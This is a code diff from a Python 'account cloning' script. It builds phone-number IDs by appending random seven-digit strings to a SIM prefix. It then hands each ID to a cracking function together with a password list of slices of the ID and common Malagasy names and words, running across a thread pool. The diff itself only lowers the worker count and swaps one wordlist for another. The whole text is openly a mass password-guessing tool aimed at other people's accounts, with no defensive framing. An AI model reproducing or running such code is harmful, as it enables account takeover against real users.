@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=70) as Dipto:
+    with tred(max_workers=50) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'mahery','safidy','mihary','nantenaina','sambatra','tsilavina','fanantenana','mahefa','mamako','santatra','fitiavako','nirina','fitiavana','nomena','solofo','fandresena','malala','anjara','hasina','felana','vadiko','amboara','tantely','finoana','razaka','sitraka','sarobidy','saholy','papako','fitiavana','seheno','fahendrena','tolotra','valisoa','dadako','koloina','fitiavako','finoana','randria','nekena','namako','nilaina','fifalina','miangaly','fandresena','faniry','harena','finaritra','mandresy','fiderana','mendrika','tokiniaina','andria','rakoto','tahiry','rojotiana','diamondra','tsilavina','maminirina','fahendrena','fiderana','tolotra','jesosy','milely','narovana','mamisoa','narindra','sarobidy','sarindra','malagasy','mamiko','malalako','rakotomalala']
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'fitahina','fifalina','fanantenana','fanomezana','fitiavana','finaritra','fiderana','fahasoavana','fandresena','fanomezantsoa','fahendrena','fanasina','miangaly','mendrika','mandresy','miangola','malala','madamako','malaso','mahefa','malagasy','mihary','manantena','malalako','tantely','tolotra','tahina','tiavina','tahirisoa','rakoto','randria','razafy','riantsoa','ricardo','rojotiana','diamondra','nantenaina','nirina','nilaina','notahina','narovana','nomena','lalatiana','liantsoa','larissa','lianah','lantoniaina','lelena','jesosy','jehovah']
             Dipto.submit(method_crack,ids,passlist)
     linex() 
     print(' LE CLONING EST FINI ')
